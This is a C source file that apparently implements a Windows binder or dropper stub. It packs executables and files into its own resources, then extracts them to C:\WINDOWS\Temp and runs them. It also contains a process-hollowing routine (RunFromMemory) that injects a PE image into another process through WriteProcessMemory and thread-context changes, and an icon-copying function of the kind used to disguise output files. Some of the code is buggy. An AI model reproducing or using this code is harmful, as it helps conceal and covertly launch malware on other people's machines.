#include "run.h"



/*void Run(int id, char *path)
{
    HGLOBAL hResData;
    HRSRC   hResInfo;
    void    *pvRes;
    DWORD dwSize;
    char* lpMemory;
    HMODULE hModule = GetModuleHandle(NULL);
    if ((hResInfo = FindResource(hModule, MAKEINTRESOURCE(id), RT_RCDATA)) != NULL)
    {
        if ((hResData = LoadResource(hModule, hResInfo)) != NULL)
        {
            if ((pvRes = LockResource(hResData)) != NULL)
            {
                dwSize =  source(hModule, hResInfo);
                if(dwSize == 0)
                {
                    puts("no data");
                    return;
                }
                else
                {
                    //printf("%d", dwSize);
                }
                lpMemory = (char*)malloc (dwSize);
                memset(lpMemory,0,dwSize);
                memcpy (lpMemory, pvRes, dwSize);
                RunFromMemory(lpMemory,path);
            }
        }
    }
}*/

void Run(int id)
{
    char *dir = malloc(1);
    dir[0] = 0;
    DWORD size = 0;
    size = GetCurrentDirectory(1, dir);
    free(dir);
    dir = malloc(size);
    memset(dir, 0, size);
    GetCurrentDirectory(size, dir);


    Res_data res = get_resource(id);
    Res_data Rpath = get_resource(id - ID_EXE_DATA + ID_EXE_PATH);
    char *path = malloc(Rpath.size-1);
    memset(path, 0, Rpath.size-1);
    memcpy(path, Rpath.data+2, Rpath.size-2);
    path[Rpath.size-2] = '\0';
    path = (char *)cat_string("C:\\WINDOWS\\Temp\\", path);
    puts(path);

    FILE *out = fopen(path, "wb+");
    fwrite(res.data, sizeof(char), res.size, out);
    printf("%d\n", res.size);
    fclose(out);
    puts(path);

    PROCESS_INFORMATION peProcessInformation;
    STARTUPINFO peStartUpInformation;

    memset(&peStartUpInformation,0,sizeof(STARTUPINFO));
    memset(&peProcessInformation,0,sizeof(PROCESS_INFORMATION));

    peStartUpInformation.cb = sizeof(peStartUpInformation);
    CreateProcess(NULL,path,&secAttrib,NULL,FALSE,CREATE_NEW_CONSOLE,NULL,dir,&peStartUpInformation,&peProcessInformation);
}

void RunFromMemory(char* pImage,char* pPath)
{
    DWORD dwWritten = 0;
    DWORD dwHeader = 0;
    DWORD dwImageSize = 0;
    DWORD dwSectionCount = 0;
    DWORD dwSectionSize = 0;
    DWORD firstSection = 0;
    DWORD previousProtection = 0;
    DWORD jmpSize = 0;

    IMAGE_NT_HEADERS INH;
    IMAGE_DOS_HEADER IDH;
    IMAGE_SECTION_HEADER Sections[1000];

    PROCESS_INFORMATION peProcessInformation;
    STARTUPINFO peStartUpInformation;
    CONTEXT pContext;

    char* pMemory;
    char* pFile;
    memcpy(&IDH,pImage,sizeof(IDH));
    memcpy(&INH,(void*)((DWORD)pImage+IDH.e_lfanew),sizeof(INH));

    dwImageSize = INH.OptionalHeader.SizeOfImage;
    pMemory = (char*)malloc(dwImageSize);
    memset(pMemory,0,dwImageSize);
    pFile = pMemory;

    dwHeader = INH.OptionalHeader.SizeOfHeaders;
    firstSection = (DWORD)(((DWORD)pImage+IDH.e_lfanew) + sizeof(IMAGE_NT_HEADERS));
    memcpy(Sections,(char*)(firstSection),sizeof(IMAGE_SECTION_HEADER)*INH.FileHeader.NumberOfSections);

    memcpy(pFile,pImage,dwHeader);

    if((INH.OptionalHeader.SizeOfHeaders % INH.OptionalHeader.SectionAlignment)==0)
    {
        jmpSize = INH.OptionalHeader.SizeOfHeaders;
    }
    else
    {
        jmpSize = INH.OptionalHeader.SizeOfHeaders / INH.OptionalHeader.SectionAlignment;
        jmpSize += 1;
        jmpSize *= INH.OptionalHeader.SectionAlignment;
    }

    pFile = (char*)((DWORD)pFile + jmpSize);

    for(dwSectionCount = 0; dwSectionCount < INH.FileHeader.NumberOfSections; dwSectionCount++)
    {
        jmpSize = 0;
        dwSectionSize = Sections[dwSectionCount].SizeOfRawData;
        memcpy(pFile, (char*)(pImage + Sections[dwSectionCount].PointerToRawData),dwSectionSize);

        if((Sections[dwSectionCount].Misc.VirtualSize % INH.OptionalHeader.SectionAlignment)==0)
        {
            jmpSize = Sections[dwSectionCount].Misc.VirtualSize;
        }
        else
        {
            jmpSize = Sections[dwSectionCount].Misc.VirtualSize / INH.OptionalHeader.SectionAlignment;
            jmpSize += 1;
            jmpSize *= INH.OptionalHeader.SectionAlignment;
        }
        pFile = (char*)((DWORD)pFile + jmpSize);
    }


    memset(&peStartUpInformation,0,sizeof(STARTUPINFO));
    memset(&peProcessInformation,0,sizeof(PROCESS_INFORMATION));
    memset(&pContext,0,sizeof(CONTEXT));

    peStartUpInformation.cb = sizeof(peStartUpInformation);
    if(CreateProcess(NULL,pPath,&secAttrib,NULL,FALSE,CREATE_NEW_CONSOLE/*&CREATE_SUSPENDED*/,NULL,NULL,&peStartUpInformation,&peProcessInformation))
    {
        pContext.ContextFlags = CONTEXT_FULL;
        GetThreadContext(peProcessInformation.hThread,&pContext);
        VirtualProtectEx(peProcessInformation.hProcess,(void*)((DWORD)INH.OptionalHeader.ImageBase),dwImageSize,PAGE_EXECUTE_READWRITE,&previousProtection);
        WriteProcessMemory(peProcessInformation.hProcess,(void*)((DWORD)INH.OptionalHeader.ImageBase),pMemory,dwImageSize,&dwWritten);
        WriteProcessMemory(peProcessInformation.hProcess,(void*)((DWORD)pContext.Ebx + 8),&INH.OptionalHeader.ImageBase,4,&dwWritten);
        pContext.Eax = INH.OptionalHeader.ImageBase + INH.OptionalHeader.AddressOfEntryPoint;
        SetThreadContext(peProcessInformation.hThread,&pContext);
        VirtualProtectEx(peProcessInformation.hProcess,(void*)((DWORD)INH.OptionalHeader.ImageBase),dwImageSize,previousProtection,0);
        ResumeThread(peProcessInformation.hThread);
    }
    free(pMemory);
}


/* change icon */
void change_icon (const char *host, const char *prog, int id)
{
    HMODULE hSrcModule;
    HRSRC hSrcRes, hSrcLockRes, hSrcFindRes, hResUpdate;

    hSrcModule = LoadLibraryA(host);
    hSrcFindRes = FindResource(hSrcModule, MAKEINTRESOURCE(id), RT_ICON);
    hSrcRes = LoadResource(hSrcModule, hSrcFindRes);
    hSrcLockRes = LockResource(hSrcRes);
    hResUpdate = BeginUpdateResource(prog, FALSE);
    UpdateResource(hResUpdate,
            RT_ICON,
            MAKEINTRESOURCE(id),
            0,
            hSrcLockRes,
            SizeofResource(hSrcModule, hSrcFindRes));
    EndUpdateResource(hResUpdate, FALSE);
}


/*void Extract(const char *prog, int id, const char *filename)
{
    HRSRC res;              // handle/ptr. to res. info.
    HGLOBAL res_loaded;     // handle to loaded resource
    char *res_lock;	        // pointer to resource data
    DWORD res_size;
    FILE *output = fopen(filename, "wb+");
    HMODULE exe = LoadLibrary(prog);

    // find location of the resource and get handle to it
    res = FindResDrawIconource(exe, MAKEINTRESOURCE(id), RT_RCDATA);

    // loads the specified resource into global memory.
    res_loaded = LoadResource(exe, res);

    // get a pointer to the loaded resource!
    res_lock = (char*)LockResource(res_loaded);

    // determine the size of the resource, so we know how much to write out to file!
    res_size = SizeofResource(exe, res);
    //printf("%d\n", (int)res_size);

    fwrite(res_lock, 1, res_size, output);

    fclose(output);
    FreeLibrary(exe);
}*/

/******************** done below *********************/

void Extract_and_Run()
{
    int dir;
    int exe;
    int file;

    get_config(&dir, &exe, &file);
    printf("%d %d %d\n", dir, exe, file);
    extract_dir(dir);
    extract_file(file);
    extract_exe(exe);
}

char* Load_file(const char *path, int size)
{
    FILE *file = fopen(path, "rb");
    char *buf = malloc(size);
    memset(buf, 0, size);

    if(buf == NULL) {
        puts("point is null");
    }


    fread(buf, sizeof(char), size, file);

    /*int i=0;
    for(i=0 ; !feof(file) ; i++) {
        buf[i] = fgetc(file);
    }*/

    fclose(file);

    return buf;
};

void extract_dir(int num)
{
    Res_data res;
    int i = 0;

    for (i = 0; i < num; i++) {
        res = get_resource(ID_DIR + i);
        char *buf = malloc(res.size-1);
        memset(buf, 0, res.size-1);
        memcpy(buf, res.data+2, res.size-2);
        buf[res.size-2] = '\0';
        puts(buf);
        CreateDirectory(buf, NULL);
        free(buf);
    }
};

void extract_exe(int num)
{
    int i = 0;

    for (i = 0; i < num; i++) {
        Run(ID_EXE_DATA+i);
    }
};

void extract_file(int num)
{
    Res_data res;
    int i = 0;

    for (i = 0; i < num; i++) {
        res = get_resource(ID_FILE_PATH + i);

        char *path = malloc(res.size-1);
        memset(path, 0, res.size-1);
        memcpy(path, res.data+2, res.size-2);
        path[res.size-2] = '\0';
        puts(path);

        res = get_resource(ID_FILE_DATA + i);

        FILE *out = fopen(path, "wb+");
        fwrite(res.data, sizeof(char), res.size, out);

        fclose(out);
        free(path);
    }
};

void Update(int id, const char *data, int size)
{
    if(size == 0) {
        return;
    }

    BOOL result;

    char *buf = malloc(size);
    memset(buf, 0, size);
    memcpy(buf, data, size);

// Add the dialog box resource to the update list.
    result = UpdateResource(update,    // update resource handle
                            RT_RCDATA,                         // change dialog box resource
                            MAKEINTRESOURCE(id),         // dialog box id
                            MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),  // neutral language
                            buf,                         // ptr to resource info
                            size);       // size of resource info

    if (result == FALSE)
    {
        puts("Could not add resource.");
        return;
    }

    free(buf);
}

void get_config(int *dir, int *exe, int *file)
{
    Res_data res = get_resource(ID_CONFIG);

    sscanf(res.data, "%d%d%d", dir, exe, file);
}

DWORD res_size(const char *prog, int id)
{
    HMODULE exe = LoadLibrary(prog);
    HRSRC res;
    DWORD size;

    res = FindResource(exe, MAKEINTRESOURCE(id), RT_RCDATA);
    size = SizeofResource(exe, res);
    //printf("%d\n", size);

    return size;
}

Res_data get_resource(int id)
{
    HRSRC res;
    HGLOBAL res_loaded;
    Res_data data;

    res = FindResource(NULL, MAKEINTRESOURCE(id), RT_RCDATA);
    res_loaded = LoadResource(NULL, res);

    data.data = (char*)LockResource(res_loaded);
    data.size = SizeofResource(NULL, res);

    return data;
}

const char* make_config (int dir, int exe, int file)
{
    const char *config;

    config = make_string(dir);
    config = cat_string(config, " ");

    config = cat_string(config, make_string(exe));
    config = cat_string(config, " ");

    config = cat_string(config, make_string(file));
    config = cat_string(config, " ");

    return config;
}

const char* make_string (int num)
{
    char *str;
    int len = 0;
    int tmp = num;

    if(tmp == 0) {
        str = malloc(2);
        str[0] = '0';
        str[1] = '\0';
        return str;
    }

    while (tmp) {
        tmp /= 10;
        len++;
    }

    str = malloc(len+1);
    memset(str, 0, len+1);
    sprintf(str, "%d", num);

    return str;
};

void update_config (const char *config)
{
    puts("update config");
    Update(ID_CONFIG, config, strlen(config));
    puts(config);
}

void update_dir (Dir_file *dirs)
{
    int i = 0;
    for (i = 0; dirs != NULL; i++, dirs = dirs->next_dir) {
        Update(ID_DIR+i, dirs->path, strlen(dirs->path));
        printf("DIR: %d %s %d\n", i, dirs->path, strlen(dirs->path));
    }
}

void update_exe (Exe_file *exes, const char *src)
{
    puts(src);
    int i = 0;
    for (i = 0; exes != NULL; i++, exes = exes->next_exe) {
        printf("EXE: %d\n", i);
        const char *path = cat_string(src, exes->path+2);
        printf("EXE: %d %s %d\n", i, path, strlen(path));
        char *data = Load_file(path, exes->size);
        Update(ID_EXE_DATA+i, data, exes->size);
        free(data);

        Update(ID_EXE_PATH+i, exes->path, strlen(exes->path));
        printf("EXE: %d %s %d\n", i, path, strlen(path));
    }
}

void update_file (Data_file *files, const char *src)
{
    int i = 0;
    for (i = 0; files != NULL; i++, files = files->next_file) {
        const char *path = cat_string(src, files->path+2);
        char *data = Load_file(path, files->size);
        Update(ID_FILE_DATA+i, data, files->size);
        free(data);

        Update(ID_FILE_PATH+i, files->path, strlen(files->path));
        printf("FILE: %d %s %d\n", i, path, strlen(path));
    }
}

const char* cat_string(const char* first, const char* second)
{
    char *str;
    int len;

    len = strlen(first) + strlen(second);
    str = malloc(len);
    memset(str, 0, len);

    strcpy(str, first);
    strcat(str, second);

    return str;
}
